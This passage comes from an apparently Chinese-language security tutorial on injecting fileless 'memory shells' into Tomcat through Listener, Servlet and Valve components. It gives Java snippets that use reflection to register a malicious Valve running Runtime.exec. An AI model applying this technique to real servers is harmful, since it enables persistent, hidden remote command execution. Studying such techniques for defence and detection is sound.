            }
### 3.添加Listener
反射获取的StandardContext有addApplicationEventListener()添加Listener
    standardContext.addApplicationEventListener(listener);
注意这里request1需要用final修饰，不然在newServletRequestListener匿名内部类里无法使用，会报`Cannot refer
to the non-final local variable request1 defined in an enclosing scope`错误
POC：
    // listenerTrojan.jsp
## 三、Servlet内存马
Servlet开始于Web容器启动，直到Web容器停止运行。要注入servlet，就需要开启动态添加Servlet，在Tomcat7以后才有addServlet()方法
### Servlet生成与配置
#### Servlet注册
Context 负责管理 Wapper ，而 Wapper 又负责管理 Servlet 实例。
通过StandardContext.createWapper()创建Wapper对象。
创建好了Wapper，跟进一下Servlet配置流程，在
org.apache.catalina.core.StandardWapper#setServletClass() 下断点
在ContextConfig#webconfig()处配置webconfig，根据web.xml配置context
然后调用了configureContext()
configureContext()依次读取了 Filter、Listener、Servlet的配置及其映射
在Servlet部分createWrapper()、设置了启动优先级LoadOnStartUp以及servletName。这里loadOnStartup就是负责动态添加Servlet的函数
然后设置了servletClass
最后把wrapper 添加进context的child
循环遍历完了所有servlets，接下来添加Servlet-Mapper，也就是web.xml中的``。循环addServletMappingDecoded将url和servlet类做映射
总结一下servlet注册过程：
  1. 调用StandardContext.createWrapper为servlet创建wrapper
  2. 配置LoadOnStartup启动优先级
  3. 配置ServletName
  4. 配置ServletClass
  5. addChild添加wrapper到Context
  6. addServletMappingDecode添加映射
其实到这里就能模拟servlet注册构造内存马了
不过LoadOnStartup设置优先级，也就是动态添加servlet的过程还不清楚
#### wrapper装载
跟进到startInternal，发现在加载完Listener和Filter后，开始loadOnstartup
findChildren()将所有Wrapper传入loadOnStartup()处理，loadOnStartup获取到所有Wrapperchild，并且getLoadOnstartup获取到servlet启动顺序，>=0的存放在wapper_list
如果loadOnstartup`，该属性默认-1
循环装载wrapper
装载过程总的一句话，LoadOnStartup>=0才行
### 1.获取context
> 测试的时候记得把上一个马删掉，以免冲突
## 四、valve内存马
value是Tomcat中对Container组件进行的扩展。Container组件也就是前文一直提及的Tomcat四大容器
Tomcat由四大容器组成，分别是 **Engine、Host、Context、Wrapper**
。这四个组件是负责关系，存在包含关系。只包含一个引擎（Engine）：
>
> Engine（引擎）：表示可运行的Catalina的servlet引擎实例，并且包含了servlet容器的核心功能。在一个服务中只能有一个引擎。同时，作为一个真正的容器，Engine元素之下可以包含一个或多个虚拟主机。它主要功能是将传入请求委托给适当的虚拟主机处理。如果根据名称没有找到可处理的虚拟主机，那么将根据默认的Host来判断该由哪个虚拟主机处理。  
>  Host （虚拟主机）：作用就是运行多个应用，它负责安装和展开这些应用，并且标识这个应用以便能够区分它们。它的子容器通常是
> Context。一个虚拟主机下都可以部署一个或者多个Web App，每个Web
> App对应于一个Context，当Host获得一个请求时，将把该请求匹配到某个Context上，然后把该请求交给该Context来处理。主机组件类似于Apache中的虚拟主机，但在Tomcat中只支持基于FQDN(完全合格的主机名)的“虚拟主机”。Host主要用来解析web.xml。  
>  Context（上下文）：代表 Servlet 的 Context，它具备了 Servlet 运行的基本环境，它表示Web应用程序本身。Context
> 最重要的功能就是管理它里面的 Servlet 实例，一个Context代表一个Web应用，一个Web应用由一个或者多个Servlet实例组成。  
>  Wrapper（包装器）：代表一个 Servlet，它负责管理一个 Servlet，包括的 Servlet
> 的装载、初始化、执行以及资源回收。Wrapper 是最底层的容器，它没有子容器了，所以调用它的 addChild 将会报错。
这四大组件都有自己的管道Pipeline。就像前文Filter和Servlet的实际处理请求的方法，都在Wrapper的管道Pipeline->Valve-ValveBase-StandardWrapperValve#invoke方法中调用
Pipeline就相当于拦截器链，具体看
当请求到达`Engine`容器的时候，`Engine`并非是直接调用对应的`Host`去处理相关的请求，而是调用了自己的一个组件去处理，这个组件就叫做`pipeline`组件
valve接口
valve的invoke方法将请求传入下一个valve。如果不调用下一个valve的invoke，那请求到此中断
在servlet调试时也能看到依次调用valve的过程：
`Valve`存放的方式并非统一存放在`Pipeline`中，而是像一个链表一个接着一个。
调用`getNext()`方法即可获取在这个`Pipeline`上的下个`Valve`实例
一般使用实现了valve接口的ValveBase类：
### valve的生成和配置
#### 1.新建valve
新建valve只需要继承ValveBase类并实现invoke方法，pipeline管道会依次执行valve的invoke
    public class EvilValve extends ValveBase{
        @Override
        public void invoke(Request request, Response response) {
            try{
                Runtime.getRuntime().exec("calc");
                this.getNext().invoke(request, response);
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }
#### 2.注册valve
**四大组件Engine/Host/Context/Wrapper都有自己的Pipeline**
，在ContainerBase基类里定义了Pipeline:
而StandardPipeline标准类里有addValve方法
#### 3.调用valve
在CoyoteAdapter.service()获取了Pipeline的第一个Valve，并且调用了invoke
这里的第一个valve就是StandardEngineValve
跟进到StandardEngineValve#invoke，可以看到调用了下一个invoke，在左下角的调试框，也就是valve.invoke的调用顺序
根据valve的生成和配置，模拟注册恶意valve：
  1. 获取context
  2. 从StandardContext反射获取StandardPipeline
  3. 调用addValve添加恶意Valve
### 1\. 获取context
    Field requestField = request.getClass().getDeclaredField("request");
        requestField.setAccessible(true);
        final Request request1 = (Request) requestField.get(request);
        StandardContext standardContext = (StandardContext) request1.getContext();
### 2\. 反射获取StandardPipeline
    Field pipelineField = ContainerBase.class.getDeclaredField("pipeline");
        pipelineField.setAccessible(true);
        StandardPipeline standardPipeline1 = (StandardPipeline) pipelineField.get(standardContext);
### 3\. 创建注册恶意valve并添加进standardPipeline
    ValveBase valveBase = new ValveBase() {
            @Override
            public void invoke(Request request, Response response){
                try {
                    Runtime.getRuntime().exec("calc");
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
        standardPipeline1.addValve(valveBase);
为了使正常invoke能进行下去，恶意valve也应该调用下一个valve.invoke
    this.getNext().invoke(request, response);
完整代码：
    //valveTrojan.jsp
## others
至于为什么说是内存马，比如上面listenerTrojan.jsp访问一遍后，注册了listener。然后就可以把jsp删掉了，再访问上下文环境就能直接带上参数命令执行。只要服务器不重启就一直运行
不过上述内存马都不是真正意义上的内存马，它们会输出在tomcat的目录下
比如上述运行的jsp，在CTALINA_BASE环境的`work\Catalina\localhost\Servlet_web环境\org\apache\jsp`都有相应的文件
关于真正意义上的内存马注入：
借助cc链进行内存马注入
参考：
参考了Ho1aAs的多篇文章：